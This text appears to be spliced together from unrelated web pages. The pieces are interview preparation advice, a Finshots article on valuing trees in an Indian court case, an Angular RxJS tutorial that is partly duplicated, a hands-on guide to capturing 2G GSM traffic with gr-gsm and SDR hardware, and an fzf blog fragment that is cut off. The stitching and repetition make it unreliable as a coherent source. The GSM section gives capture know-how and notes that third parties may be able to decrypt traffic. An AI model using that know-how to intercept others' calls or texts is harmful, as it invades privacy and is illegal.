<p>Recruiters can be either internal or external to the company. Internal recruiters would only work for one company while an external recruiter might be able to set up interviews with multiple companies for you. You don’t have to pay the recruiter as the company will pay them when someone gets hired, so it’s typically in their best interest to get you an offer. Regardless of which type, except for smaller startups, most roles will have a recruiter coordinating the interview process. They can be invaluable to ask questions about what to study for and know what to expect in the interviews. They can also provide feedback after the interview so that you know which areas to study more for your next interview.</p>

<h3 id="books">Books</h3>

<p>Everyone learns differently and comprehensively going through books in addition to practicing using the above resources can give you an edge of others. Here’s a few that can be good to get started with.</p>

<ul>
  <li><a href="https://amzn.to/3tEAsvu" target="_blank" rel="noopener noreferrer">Introduction to Algorithms</a></li>
  <li><a href="https://amzn.to/2YUtkNt" target="_blank" rel="noopener noreferrer">Design Patterns</a></li>
  <li><a href="https://amzn.to/3ibkSlA" target="_blank" rel="noopener noreferrer">Cracking the Coding Interview</a></li>
  <li><a href="https://amzn.to/3souEWj" target="_blank" rel="noopener noreferrer">Clean Code</a></li>
  <li><a href="https://amzn.to/3bLblRf" target="_blank" rel="noopener noreferrer">The Complete Software Developer’s Career Guide</a></li>
</ul>

<h3 id="next">Next</h3>
<p>The coding interview is just one part of the interview process. Other areas to study include systems design, culture fit, and behavioral interviews. You’ll have to master all of them to get through the interviews at a larger company and receive an offer.</p>

                    <p><em>In today's Finshots we talk about trees :)</em></p><!--kg-card-begin: hr--><hr><!--kg-card-end: hr--><!--kg-card-begin: html--><!--kg-card-end: html--><h3 id="the-story">The Story</h3><p>The economic value of a tree shouldn’t just be limited to the value of timber. Instead, it must encompass its lifetime contribution. Trees prevent contamination of soil. They improve the quality of water underground. They provide natural shading, extract carbon-di-oxide, offer oxygen. A few trees in a neighbourhood can make the whole place much cooler. Your AC bill will start seeing improvements. You can alleviate flooding risks. Old trees have heritage value. They have been around for a long time. They’ve seen the great depression. They’ve seen the tricolour unfurl for the first time. They’ve seen bloodshed. They’ve seen peace. Some of them are irreplaceable. And yet, governments are often forced to uproot these national treasures in the name of development. Sometimes it’s understandable. But most times, it’s simply egregious.</p><p>The government has often relied on a rather simplistic arrangement. Uproot one tree and plant a few odd saplings somewhere else. That should do, right? While the logic can be appealing, this isn’t exactly a like for like replacement. Different trees support different kinds of ecology. There’s no point replacing a <a href="http://www.earthamag.org/stories/2017/2/21/a-tree-cut-is-not-the-same-as-a-tree-planted-understanding-quick-fix-solutions-to-development-consequences" rel="noopener">sal tree with teak</a>. And there’s most certainly no point in planting a sapling and forgetting about it. Often times, they don’t get the attention they deserve. They are condemned to death the moment they are planted. So there is an obvious need to relook at our strategy. And when the West Bengal government decided to cut 356 trees to construct five railway overbridges (RoBs), the matter was brought in front of the Supreme Court.</p><p>The court had a tough task at hand. Obviously, the overbridge was deemed necessary. But then cutting down so many trees also seemed excessive. So they put together a committee of five experts last year to figure out the economic value of a tree.</p><p>And their recommendations were made public last Wednesday. The value of a tree. according to the committee should tally up to its age multiplied by Rs 74,500. Also, according to a <a href="https://timesofindia.indiatimes.com/india/value-of-a-tree-with-100-years-of-life-left-is-rs-72-lakh-sc-told/articleshow/80679683.cms">report in the Times of India </a>—<em> “The true value of a tree, with 100 years of its lifespan remaining, would be Rs 72 lakh... The committee said 50 trees had already been cut, but the 306 remaining trees, many of which are of heritage value, would be valued at Rs 220 crores.”</em></p><p>Truly staggering and if the government is in fact forced to pay this sum, then we are assuming this will be spent in conservation efforts elsewhere. And granted, you might think this valuation is bonkers. In fact, as soon as the report was made available, the court did remark that the current method of valuation would bankrupt most governments. But even if the court were to discount the value by 50%, that’s still substantial. It would create massive disincentives for the government. If they are forced to spend a ludicrous amount of money to uproot trees, then they will seek alternatives. </p><p>Thinking about felling 500 trees to widen a road? Maybe you will find ways to redirect traffic somewhere else. Thinking about uprooting a 100-year-old tree? Maybe you will translocate it. And even if you don’t fully compensate for the trees, maybe you could invest more in planting saplings. Take care of them, nurture them, make sure they are a like for like replacement. It’s all on the table. So even if the courts do try and “rationalize” the suggestions made by the committee, we hope that they won’t dilute it entirely. As a species, we are in a very precarious spot. If we continue to disregard the role trees play in sustaining humanity, there’s no doubt it won’t end well for us. Anyway, what do you think about the valuation? Should we now start extending this treatment to other natural resources?</p><p>You tell us.

            <p><span id="hs_cos_wrapper_post_body" data-hs-cos-general-type="meta_field" data-hs-cos-type="rich_text"><p>One of the most common hindrances a developer will cope within its journey will be a bug due to a side effect of an asynchronous method. Everything was supposed to work as expected, though, eventually, it did not. Using imperative programming, developers often pull their hair out anticipating when a function will be triggered and how it will affect the state. From this chaos will soar multiple bugs. <strong>Reactive programming, therefore, appeared as an answer for developers to put them in a state of mind where they can code imitating the events that occur in their application.</strong></p>
<!--more-->
<p>Though shifting from imperative to reactive programming is tricky at first, in this article we will define what coding reactively actually means, the tools to code reactively and through an example show in which pitfalls a greenhorn reactive programmer could fall and how to avoid it. In this example, our purpose is to build a cocktail carousel app.</p>
<p>We aim to create:</p>
<ul>
<li>a search bar where users can type in a text, to look for a drink they want to discover</li>
<li>we display a list of 3 answers on the screen</li>
<li>a list that updates every 1.5 seconds</li>
<li>images switching one spot to the left, as a new one appears on the right-hand side</li>
</ul>
<p>Ideally this would look like this</p>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=600&amp;name=Gif1.gif" alt="Gif1" width="600" srcset="https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=300&amp;name=Gif1.gif 300w, https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=600&amp;name=Gif1.gif 600w, https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=900&amp;name=Gif1.gif 900w, https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=1200&amp;name=Gif1.gif 1200w, https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=1500&amp;name=Gif1.gif 1500w, https://www.sipios.com/hs-fs/hubfs/Gif1.gif?width=1800&amp;name=Gif1.gif 1800w" sizes="(max-width: 600px) 100vw, 600px"></p>
<h3>But before we need to change our focus...</h3>
<p>As the owner of a store during the pandemic, you aim at counting the number of people that are currently in your store in order to enable social distancing inside. You could think of an iterative way which would be to check the number of people in your store and count it manually. You could also start at 0 in the morning when you open and then only look at the door, increment or decrement based on people coming or leaving the place. The first option requires burning the midnight oil, especially if your store has a lot of rooms. With the second option, you only have to look at the door without moving from your chair, which makes the calculation way easier.</p>
<p>This is exactly what Reactive programming is about:</p>
<blockquote>
<p><em>"Reactive programming is a programming paradigm that is built around the notion of continuous time-varying values and propagation of change. It facilitates the declarative development of event-driven applications by allowing developers to express programs in terms of what to do, and let the language automatically manage when to do it."</em> Bainomugisha et al., A Survey on Reactive Programming, 2012</p>

<p><strong>Though it's conceptually hard to dive in at first glance, the code becomes easier to read and maintain, with a paradigm based on events happening in your application</strong>. Indeed, to come back to our store example, the second method fits clients' behavior best. A client spending a long time wandering in your store could be counted in many of the checks you make. Looking at the door is independent of this behavior. No matter what the client does in your store, it will only trigger two kinds of events: entrance, exit.</p>
<p><strong>Developers start thinking about code as a suite of events that modify a state</strong>. Rather than looking at the state, the object itself, the developer would look at the events that would modify the state, regardless of the state itself.</p>
<p>Here we'll dive in more depth into how <strong>Angular implements Reactive programming with the use of a pattern called Observable.</strong></p>
<h2>From callbacks to streams</h2>
<p>To better understand what Observables are, let's try to differentiate them starting from one of the most famous asynchronous patterns in JS, Promises. <strong>While a Promise happens once in time and will return the desired output or throw an error, Observables in Angular, are a stream of data over time.</strong> <strong>A stream can have multiple values succeeding at various frequencies in time</strong>. After we get the first value emitted on the Observable stream, contrary to a Promise, it will keep living until you complete it.</p>
<blockquote>
<p><em>"Reactive Programming is programming with asynchronous data streams."</em></p>
</blockquote>
<p>In order to access and use the values that are emitted through this stream, you can <code>subscribe</code> to this Observable stream and get notified every time a new value is emitted on this stream.</p>
<pre><code><span>Observable([1, 2, 3]).subscribe(number =&gt; console.log(number))</span><br><span>//Output: 1, 2, 3</span><p><span>Observable([1, 2, wait3seconds, 3]).subscribe(number =&gt; console.log(number))</span><br><span>//Output: 1, 2, ..., 3</span></p></code></pre>
<p>While Promises are like the action of going to a shop and buy your newspapers once, Observables act like a subscription to the magazine. Every time a new edition is published, every subscriber will receive a copy. Both the magazine (in case of bankruptcy for instance) or the subscribers can stop the subscription to this stream.</p>
<h3>Operators</h3>
<p><span>We are now going to dive into how to create and manipulate (transform, filter, ...) and terminate these observables. To perform these actions one can use Operators (for creation, and also transformation, filtering, termination)</span>. To better understand what these operators do to an Observable, we represent them using marble diagrams. You'll find a list of operators and their diagrams here at <a href="https://rxmarbles.com/" rel="noopener">RxMarbles</a><a href="https://rxmarbles.com/"></a>. These operators were popularised by the project <a href="http://reactivex.io/" rel="noopener">ReactiveX</a>&nbsp;which aims to provide different APIs in multiple programming languages (including RxJS, the one used in this article). <span>ReactiveX implements the Observer pattern, which is having Observers subscribing to events (Observables) and performing side effects based on this event, using combinations of operators.</span></p>
<p>I can subscribe to a magazine. When I receive a new one, I use an operator to make coffee and another one to read it.</p>
<p>Let's look at a classic creation operator to better grasp how observables are generated and evolve through time: the <code>interval</code>. <code>Interval</code> creates a stream of data that emits an incremented suite of integers at a given pace (in this example every 1000 ms)</p>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Img2.png?width=2014&amp;name=Img2.png" alt="Img2" width="2014" srcset="https://www.sipios.com/hs-fs/hubfs/Img2.png?width=1007&amp;name=Img2.png 1007w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=2014&amp;name=Img2.png 2014w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=3021&amp;name=Img2.png 3021w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=4028&amp;name=Img2.png 4028w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=5035&amp;name=Img2.png 5035w, https://www.sipios.com/hs-fs/hubfs/Img2.png?width=6042&amp;name=Img2.png 6042w" sizes="(max-width: 2014px) 100vw, 2014px"></p>
<p>This creation can be pretty useful, but let's introduce transformation operators with another use case. If we don't want the list of integers but rather the list of multiples of ten we can use the Observable we just created and map the values using a transformation operator. This will enable you to transform the data emitted from the stream of the observable and create another stream from the input one.</p>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Img3.png?width=1636&amp;name=Img3.png" alt="Img3" width="1636" srcset="https://www.sipios.com/hs-fs/hubfs/Img3.png?width=818&amp;name=Img3.png 818w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=1636&amp;name=Img3.png 1636w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=2454&amp;name=Img3.png 2454w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=3272&amp;name=Img3.png 3272w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=4090&amp;name=Img3.png 4090w, https://www.sipios.com/hs-fs/hubfs/Img3.png?width=4908&amp;name=Img3.png 4908w" sizes="(max-width: 1636px) 100vw, 1636px"></p>
<p>As a matter of fact, we can look at the map operator which applies a function to an entry Observable stream, and returns an Observable whose values are the output of the function applied to the entry stream values.</p>
<p>Eventually, you can use operators to stop the Observable stream. For instance, the <code>first</code> operator will complete the Observable after the first value is emitted on the stream. The <code>first</code> operator is actually enough to make an Observable behave like a Promise (which is the opposite of the purpose of this article but interesting to grasp the concept of Observables).</p>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Img4.png?width=1636&amp;name=Img4.png" alt="Img4" width="1636" srcset="https://www.sipios.com/hs-fs/hubfs/Img4.png?width=818&amp;name=Img4.png 818w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=1636&amp;name=Img4.png 1636w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=2454&amp;name=Img4.png 2454w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=3272&amp;name=Img4.png 3272w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=4090&amp;name=Img4.png 4090w, https://www.sipios.com/hs-fs/hubfs/Img4.png?width=4908&amp;name=Img4.png 4908w" sizes="(max-width: 1636px) 100vw, 1636px"></p>
<p>Let's look at how we could use Observables, using them as Promises (which is the main pitfall new reactive programmers fall into).</p>
<h2>Moving to reactive programming: (unwisely) use Observables like Promises</h2>
<p><strong>The first misuse of Observables developers can make is to use them as if they were Promises thanks to the subscribe method.</strong> This method looks like a callback in which developers tend to put the behavior they will expect. Indeed one of the main pain point at first when dealing with Observables is how to manipulate the value. As Observables are lazy by nature, Angular will not calculate an observable if you do not subscribe to it, hence the reflex to subscribe, get the value and do something with it. This is exactly what callbacks are about.</p>
<p>However, as we said, unlike a Promise, Observable live through time, and contrary to callbacks, the code contained in the <code>subscribe</code> method will be executed every time the observable changes, resulting in potential side effects and memory leaks potentially.</p>
<p>Let's now look at a first piece of code that generates an (invalid) implementation of the carousel</p>
<p>The carousel dynamic is created thanks to an observable <code>interval</code>. This observable emits every 1500ms an integer. Its marble diagram is the aforementioned one.</p>
<pre><code><span>constructor(private http: HttpClient) {}</span><br><span>  search = new FormControl('');</span><br><span>  drinksCarousel = [];</span><br><span>  baseUrl = '&lt;https://www.thecocktaildb.com/api/json/v1/1/search.php?s=&gt;';</span><br><span>  ngOnInit() {</span><br><span>    this.search.valueChanges.subscribe((searchText: string) =&gt;</span><br><span>      this.http.get&lt;any&gt;(this.baseUrl + searchText).subscribe((results) =&gt; {</span><br><span>        interval(1500).subscribe((int) =&gt; {</span><br><span>          this.drinksCarousel = results.drinks.slice(int, int + 3);</span><br><span>        });</span><br><span>      })</span><br><span>    );</span><br><span>  }</span><br></code></pre>
<p><strong>We can see a first code smell here: nested subscribes.</strong> This behavior is often used to mimic callbacks as we said before but will trigger some side effects. If we type several letters, to look for "margarita" we get the following update</p>
<pre><code><span>&lt;div&gt;</span><br><span>  &lt;mat-form-field class="form-field" appearance="outline"&gt;</span><br><span>    &lt;mat-label&gt; What cocktail are you looking for? &lt;/mat-label&gt;</span><br><span>    &lt;input matInput [formControl]="search" autocomplete="off" /&gt;</span><br><span>  &lt;/mat-form-field&gt;</span><br><span>&lt;/div&gt;</span><p><span>&lt;div *ngFor="let drink of drinksCarousel" class="horizontal"&gt;</span><br><span>  &lt;app-cocktail-view</span><br><span>    [img]="drink.strDrinkThumb"</span><br><span>    [name]="drink.strDrink"</span><br><span>    [glass]="drink.strGlass"</span><br><span>    [instructions]="drink.strInstructions"</span><br><span>  &gt;&lt;/app-cocktail-view&gt;</span><br><span>&lt;/div&gt;</span></p></code></pre>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=600&amp;name=Gif5.gif" alt="Gif5" width="600" srcset="https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=300&amp;name=Gif5.gif 300w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=600&amp;name=Gif5.gif 600w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=900&amp;name=Gif5.gif 900w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1200&amp;name=Gif5.gif 1200w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1500&amp;name=Gif5.gif 1500w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1800&amp;name=Gif5.gif 1800w" sizes="(max-width: 600px) 100vw, 600px"></p>
<p>What we see here is that, instead of updating the <code>drinksCarousel</code> attribute and removing the previous list of values we had with the new one freshly fetched, multiple observables coexist and affect the state of our component simultaneously.</p>
<p>To come back to our analogy of the magazine subscription, what we would like to perform is to change the magazine we subscribe to, however, with nested subscribes, our code is creating a subscription to this new magazine, without terminating the previous one.</p>
<p>Every time our source observable (the search valueChanges) changes, the code inside the subscription is executed again. A new HTTP response is received, a new interval stream is created, thus creating another state change every 1.5s. Indeed none of the subscriptions are canceled, and they stack up silently into a huge mess until your computer crashes.</p></span></p></div></div></div>

Everything was supposed to work as expected, though, eventually, it did not. Using imperative programming, developers often pull their hair out anticipating when a function will be triggered and how it will affect the state. From this chaos will soar multiple bugs. <strong>Reactive programming, therefore, appeared as an answer for developers to put them in a state of mind where they can code imitating the events that occur in their application.</strong></p>
<!--more-->
<p>Though shifting from imperative to reactive programming is tricky at first, in this article we will define what coding reactively actually means, the tools to code reactively and through an example show in which pitfalls a greenhorn reactive programmer could fall and how to avoid it. In this example, our purpose is to build a cocktail carousel app.</p>
<p>We aim to create:</p>
<ul>
<li>a search bar where users can type in a text, to look for a drink they want to discover</li>
<li>we display a list of 3 answers on the screen</li>
<li>a list that updates every 1.5 seconds</li>
<li>images switching one spot to the left, as a new one appears on the right-hand side</li>
</ul>
<p>Ideally this would look like this</p>

<h3>But before we need to change our focus...</h3>
<p>As the owner of a store during the pandemic, you aim at counting the number of people that are currently in your store in order to enable social distancing inside. You could think of an iterative way which would be to check the number of people in your store and count it manually. You could also start at 0 in the morning when you open and then only look at the door, increment or decrement based on people coming or leaving the place. The first option requires burning the midnight oil, especially if your store has a lot of rooms. With the second option, you only have to look at the door without moving from your chair, which makes the calculation way easier.</p>
<p>This is exactly what Reactive programming is about:</p>
<blockquote>
<p><em>"Reactive programming is a programming paradigm that is built around the notion of continuous time-varying values and propagation of change. It facilitates the declarative development of event-driven applications by allowing developers to express programs in terms of what to do, and let the language automatically manage when to do it."</em> Bainomugisha et al., A Survey on Reactive Programming, 2012</p>
</blockquote>
<p><strong>Though it's conceptually hard to dive in at first glance, the code becomes easier to read and maintain, with a paradigm based on events happening in your application</strong>. Indeed, to come back to our store example, the second method fits clients' behavior best. A client spending a long time wandering in your store could be counted in many of the checks you make. Looking at the door is independent of this behavior. No matter what the client does in your store, it will only trigger two kinds of events: entrance, exit.</p>

<pre><code><span>&lt;div&gt;</span><br><span>  &lt;mat-form-field class="form-field" appearance="outline"&gt;</span><br><span>    &lt;mat-label&gt; What cocktail are you looking for? &lt;/mat-label&gt;</span><br><span>    &lt;input matInput [formControl]="search" autocomplete="off" /&gt;</span><br><span>  &lt;/mat-form-field&gt;</span><br><span>&lt;/div&gt;</span><p><span>&lt;div *ngFor="let drink of drinksCarousel" class="horizontal"&gt;</span><br><span>  &lt;app-cocktail-view</span><br><span>    [img]="drink.strDrinkThumb"</span><br><span>    [name]="drink.strDrink"</span><br><span>    [glass]="drink.strGlass"</span><br><span>    [instructions]="drink.strInstructions"</span><br><span>  &gt;&lt;/app-cocktail-view&gt;</span><br><span>&lt;/div&gt;</span></p></code></pre>
<p><img src="https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=600&amp;name=Gif5.gif" alt="Gif5" width="600" srcset="https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=300&amp;name=Gif5.gif 300w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=600&amp;name=Gif5.gif 600w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=900&amp;name=Gif5.gif 900w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1200&amp;name=Gif5.gif 1200w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1500&amp;name=Gif5.gif 1500w, https://www.sipios.com/hs-fs/hubfs/Gif5.gif?width=1800&amp;name=Gif5.gif 1800w" sizes="(max-width: 600px) 100vw, 600px"></p>
<p>What we see here is that, instead of updating the <code>drinksCarousel</code> attribute and removing the previous list of values we had with the new one freshly fetched, multiple observables coexist and affect the state of our component simultaneously.</p>
<p>To come back to our analogy of the magazine subscription, what we would like to perform is to change the magazine we subscribe to, however, with nested subscribes, our code is creating a subscription to this new magazine, without terminating the previous one.</p>
<p>Every time our source observable (the search valueChanges) changes, the code inside the subscription is executed again. A new HTTP response is received, a new interval stream is created, thus creating another state change every 1.5s. Indeed none of the subscriptions are canceled, and they stack up silently into a huge mess until your computer crashes.</p></span></p></div></div></div>

                <div>
                    <p>Looking at 2G GSM traffic three decades since its inception might not sound terribly interesting, but the protocol is still surprisingly common today. It's often used a fallback for when coverage is limited and more modern protocols aren't available, as well as for legacy IoT devices.</p><p>In Norway, Telia and Telenor are in the process of phasing our their 3G networks. At they same time they are keeping their 2G networks operational <a href="https://www.telenor.no/bedrift/iot/m2m/3g/">until at least 2025</a>. Meaning all devices that don't support VoLTE will use 2G for calls and SMS.</p><p>There are well documented security flaws in GSM, and publicly available tools to exploit them. At the same time, it has become considerably cheaper and easier to analyze GSM traffic over the past few years. Open source tools such as <a href="https://github.com/ptrkrysik/gr-gsm">gr-gsm</a> have matured, and the community has developed methods for capturing the GSM spectrum without the need for expensive SDR radios.</p><p>With less than $100 and a weekend it's possible to capture and analyze GSM traffic. With some extra effort it's possible to decrypt your own traffic, and depending on how your mobile provider has set up their network it may even be possible for somebody else to illegally decrypt traffic they don't own.</p><h3 id="the-gsm-spectrum">The GSM spectrum</h3><figure><img src="https://harrisonsand.com/content/images/2021/02/Screenshot_20210208_122702.png" alt="" srcset="https://harrisonsand.com/content/images/size/w600/2021/02/Screenshot_20210208_122702.png 600w, https://harrisonsand.com/content/images/size/w1000/2021/02/Screenshot_20210208_122702.png 1000w, https://harrisonsand.com/content/images/size/w1600/2021/02/Screenshot_20210208_122702.png 1600w, https://harrisonsand.com/content/images/2021/02/Screenshot_20210208_122702.png 1920w" sizes="(min-width: 1200px) 1200px"><figcaption>GSM spectrum, showing multiple channels</figcaption></figure><p>More often than not traffic will "hop" between different channels during a transmission. Hops occur quite quickly, every few milliseconds or so. In practice, this normally means if you're interested in looking at more than a base station's broadcast control channel (BCCH) you need a way to simultaneously capture multiple channels at once.</p><p>You can visually see the hopping in the screenshot above. Stationary control traffic is on the left, and hopping traffic is on the right. These "slices" are produced as the base stations hop between different channels during transmission.</p><p>A local tower of mine is configured to hop between ARFCN channels 57 and 112. This corresponds to downlink frequencies of 946.4 and 957.4 MHz. Channels have a bandwidth of 0.2 MHz, so that means if I want to look at both channels at once I need a radio with a bandwidth of at least 11.2 MHz (946.3 to 957.5). Keep in mind towers will be configured differently, potentially using more channels spread further apart.</p><p>Inexpensive SDRs tend to have a maximum bandwidth of about 2.4 MHz. You can overcome this limitation by using multiple radios and <a href="https://github.com/ptrkrysik/multi-rtl">multi-rtl</a>, which combines their signals together to get a larger effective bandwidth.</p><p>In my case I had access to a <a href="https://www.ettus.com/product-categories/usrp-bus-series/">USRP radio</a> that can capture up to 56 MHz of bandwidth, and that's what I'll be using for my tests. However, the core concepts are identical no matter what radio you use.</p><h3 id="other-hardware">Other hardware</h3><p>If you want to decrypt your own traffic you'll need a way to get the Kc encryption key from your SIM card. Several guides out there use a series of AT+CRSM commands that access the SIM card through the phone's modem. I have gotten this to work in the past, but many phones don't expose the modem's serial interface by default, and even if you can get access it tends to be a messy process. I prefer to use a smart card reader to pull the key from the SIM directly.</p><p>I purchased a HID OMNIKEY 6121 USB smart card reader, and some adapters from the <a href="https://piswords.aliexpress.com/store/829772">Piswords AliExpress store</a> to make it a bit less fiddly to swap SIMs in and out.</p><h3 id="software">Software</h3><p>Recent versions of Ubuntu have gr-gsm in their repositories by default. Installation on Kubuntu 20.10 was as easy as:</p><pre><code>sudo apt install gr-gsm wireshark gqrx-sdr cardpeek</code></pre><p>You'll need Wireshark for looking at traffic, gqrx if you want to visually see the spectrum, and Cardpeek for pulling keys off the SIM card.</p><p>For the USRP you'll need a bit more setup. First download the latest firmware images and then set the UHD_IMAGES_DIR environment variable.</p><pre><code>sudo uhd_images_downloader
export UHD_IMAGES_DIR=/usr/share/uhd/images</code></pre><p>Next, we configure the system so non-root users can access the radio.</p><pre><code>sudo cp /usr/lib/uhd/utils/uhd-usrp.rules /etc/udev/rules.d/
sudo udevadm control --reload-rules
sudo udevadm trigger</code></pre><p>You can test if everything is working by scanning for nearby base stations with the <code>grgsm_scanner</code> utility. It takes about a minute to start displaying data.</p><figure><img src="https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_160020.png" alt="" srcset="https://harrisonsand.com/content/images/size/w600/2021/02/Screenshot_20210207_160020.png 600w, https://harrisonsand.com/content/images/size/w1000/2021/02/Screenshot_20210207_160020.png 1000w, https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_160020.png 1177w"></figure><h3 id="find-the-base-station">Find the base station</h3><p>Before we can capture traffic we need to know what base station our phone is connected to. This is <em>probably</em> the station with the best signal strength, so in my scan above that would be CID 2106 on ARFCN channel 57. But to be sure lets double check.</p><p>On an iPhone you can dial <code>*3001#12345#*</code> which takes you to field test mode. Go to the "All Metrics" tab and scroll down to GSM Serving Cell Info.</p><figure><img src="https://harrisonsand.com/content/images/2021/02/21-02-07-16-25-45-1531-2.png" alt="" srcset="https://harrisonsand.com/content/images/size/w600/2021/02/21-02-07-16-25-45-1531-2.png 600w, https://harrisonsand.com/content/images/size/w1000/2021/02/21-02-07-16-25-45-1531-2.png 1000w, https://harrisonsand.com/content/images/2021/02/21-02-07-16-25-45-1531-2.png 1125w" sizes="(min-width: 720px) 720px"></figure><p>You can see that the ARFCN is set to 57, as we suspected. You can also look under "GSM Idle Config" to verify that the ci matches the CID from the scan, in this case 2106.</p><p>On Android the <a href="https://play.google.com/store/apps/details?id=com.wilysis.cellinfolite">Network Cell Info Lite</a> app provides similar information.</p><h3 id="base-station-arfcns">Base station ARFCNs</h3><p>Next, we need to find out what channels the base station is configured to use. This is so we know what frequencies to configure our capture for. A list of these channels is periodically broadcast inside the System Information Type 1 packets from the BCCH. </p><p>The <code>grgsm_livemon</code> utility allows us to monitor data from the BCCH. Use the <code>-f</code> flag to set the frequency of the base station. You can find this in the output from <code>grgsm_scanner</code>, or by using the <a href="https://www.cellmapper.net/arfcn">cellmapper.net</a> ARFCN frequency calculator. (use the downlink frequency)</p><pre><code>grgsm_livemon -f 946.4M</code></pre><p>Traffic is piped to the system's loopback interface inside UDP packets on port 4729. You can use this display filter to only show Type 1 packets: <code>gsm_a.dtap.msg_rr_type == 0x19</code>.</p><figure><img src="https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_164557.png" alt="" srcset="https://harrisonsand.com/content/images/size/w600/2021/02/Screenshot_20210207_164557.png 600w, https://harrisonsand.com/content/images/size/w1000/2021/02/Screenshot_20210207_164557.png 1000w, https://harrisonsand.com/content/images/size/w1600/2021/02/Screenshot_20210207_164557.png 1600w, https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_164557.png 1960w" sizes="(min-width: 1200px) 1200px"></figure><p>Looking under Cell Channel Description we can see that this base station is configured to use two ARFCNs: 57 and 112.</p><h3 id="capturing-traffic">Capturing traffic</h3><p>Using the ARFCN calculator we can see that the downlink frequencies for those channels are 946.4 and 957.4 MHz. The minimum frequency range to capture both would be 946.3 to 957.5 MHz. Adding 0.1 MHz to each end to account for the 0.2 MHz channel bandwidth.</p><p>For the capture itself, we'll use the <code>grgsm_capture</code> utility. We can use the <code>-f</code> flag to set the center frequency between our two channels, and the <code>-s</code> flag to set a sufficient sample rate / bandwidth.</p><pre><code>Usage: grgsm_capture [options] output_filename

                        hints
</code></pre><p>The center frequency is set to 951.9 MHz, and the sample rate / bandwidth is set to 12 MHz. Technically we could go down to 11.2 MHz, but 12 is a nice even number so that's what I'll use here. You can also configure the gain, but I found the default of 30 dBi to work fine.</p><p>If you see 0's printed in your console it means your dropping samples in the capture. This basically means your computer can't keep up with the data streaming from the SDR. A common cause of dropped samples are spikes in disk writes from the capture utility, and the disk can't save the data fast enough. Increasing the buffer on the USRP can help, which we do via the <code>--args</code> flag. You could also try capturing data with the <code>uhd_rx_cfile</code> utlity, which may perform slightly better.</p><p>If you still get dropped samples, you could also try saving capture files to the <code>/dev/shm/</code> directory. This will store the capture files in memory instead of disk, which has performance benefits. The downside here is there will be less storage space for the capture.</p><pre><code>grgsm_capture --args="uhd,num_recv_frames=1024" -f 951.9M -s 12.0M call.cfile</code></pre><p><strong>Note: </strong>Before taking the capture you need to make sure your phone is communicating over GSM/2G. Most phones let you set this within the cellular data options, though depending on your exact phone and carrier settings the option may be hidden. If you don't see the option try using a different phone. The lowest I could go on my iPhone was 3G, but Android let me set 2G. Also worth noting is that my iPhone would have automatically downgraded to 2G if I disabled 4G and was in an area without 3G coverage.</p><p>Start the capture, and Ctrl+C out once you're done. Keep in mind at this point we're just capturing the downlink traffic from the base station to the phone. Some good tests would be to either place a call or receive a text message.</p><h3 id="channelize-capture">Channelize capture</h3><p><code>call.cfile</code> is "wideband" capture that contains two ARFCNs. For further processing with gr-gsm we need to split each channel into its own capture file.</p><p>We can use the <code>grgsm_channelize</code> utility for this. Set the frequency and sample rate so they're the same as when we did the capture. At the end of the command append the list of ARFCNs to extract.</p><figure><img src="https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_193136.png" alt="" srcset="https://harrisonsand.com/content/images/size/w600/2021/02/Screenshot_20210207_193136.png 600w, https://harrisonsand.com/content/images/size/w1000/2021/02/Screenshot_20210207_193136.png 1000w, https://harrisonsand.com/content/images/2021/02/Screenshot_20210207_193136.png 1113w"></figure><p>A new folder will be created that contains separate capture files for each ARFCN.</p><h3 id="analyzing-bcch-traffic">Analyzing BCCH traffic</h3><p>Now we can decode the BCCH traffic from our capture.

<p>In <a href="https://qmacro.org/autodidactics/2021/02/02/fzf-the-basics-1-layout/">fzf - the basics part 1 - layout</a> I shared what I learned about controlling <code>fzf</code>’s layout.

<p>That’s a lot, and far more than I want to consider wading through.</p>

<blockquote>
  <p>Interestingly, to copy/paste this example from my terminal, I had to (discover and) use the <code>--no-mouse</code> option from the Interface category so that the mouse was free to use and not locked to <code>fzf</code> during that moment.</p>
</blockquote>

<p>But I want to think about using <code>fzf</code> in a pipeline at another time; right now I’m just digging into options where <code>fzf</code> is used without receiving anything on STDIN.</p>

<p><a name="default-command"></a>
<strong>Default command</strong></p>

<p>So what does <code>fzf</code> do if it’s not fed anything to display via STDIN? Well, the README states that unless otherwise directed, <code>fzf</code> uses the <code>find</code> command to build the list of items. The actual sentence in the <a href="https://github.com/junegunn/fzf#usage">Usage</a> section reads as follows:</p>

